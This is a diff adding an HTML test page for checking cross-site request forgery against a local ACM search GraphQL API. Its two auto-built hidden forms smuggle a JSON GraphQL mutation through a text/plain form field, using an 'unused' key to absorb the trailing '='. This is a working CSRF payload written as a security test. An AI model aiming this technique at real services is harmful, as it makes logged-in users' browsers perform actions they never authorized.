@@ -1,0 +1,21 @@
+
+<html>
+  <body>
+    <h1>Test for csrf attacks.</h1>
+    <p>You must log into ACM fiirst, then open this page in a new browser tab.</p>
+
+
+    Test CSRF attack on: http://localhost:4000/searchapi/graphql
+    <form action="http://localhost:4000/searchapi/graphql" method="POST" enctype='text/plain'>
+      <input type="hidden" name='{"operationName": "saveSearch", "query": "mutation saveSearch($resource: JSON!) {\n savedSearch(resource: $resource)\n}\n", "variables":  {"resource": {"id": "161102530000", "name": "csrf attack", "description": "Created by csrf attack.", "searchText": "kind:pod"}}, "unused": "' value='"}' />
+      <input type="submit" />
+    </form>
+
+    Test CSRF attack on: http://localhost:4000/search/console-api/graphql
+    <form action="http://localhost:4000/search/console-api/graphql" method="POST" enctype='text/plain'>
+      <input type="hidden" name='{"operationName": "saveSearch", "query": "mutation saveSearch($resource: JSON!) {\n savedSearch(resource: $resource)\n}\n", "variables":  {"resource": {"id": "161102530000", "name": "csrf attack", "description": "Created by csrf attack.", "searchText": "kind:pod"}}, "unused": "' value='"}' />
+      <input type="submit" />
+    </form>
+
+  </body>
+</html>
